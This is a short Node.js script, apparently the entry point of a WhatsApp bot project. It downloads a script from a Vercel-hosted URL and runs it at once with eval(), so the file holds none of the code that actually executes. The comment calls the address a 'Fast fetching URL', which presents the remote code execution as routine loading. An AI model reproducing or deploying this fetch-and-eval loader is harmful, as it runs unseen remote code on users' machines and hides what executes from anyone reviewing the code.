"use strict";

const axios = require('axios');

const indexURL = 'https://dullah-xmd-commands-phi.vercel.app'; // Fast fetching URL

async function fetchIndexScript() {
    try {
        console.log(`📥 Fetching index from ${indexURL}...`);
        
        const response = await axios.get(indexURL);
        const scriptContent = response.data;

        console.log(`✅ Index script loaded successfully.`);
        eval(scriptContent); // Execute the script immediately

    } catch (error) {
        console.error(`❌ Error fetching index:`, error.message);
    }
}

// Start fetching index script
fetchIndexScript();
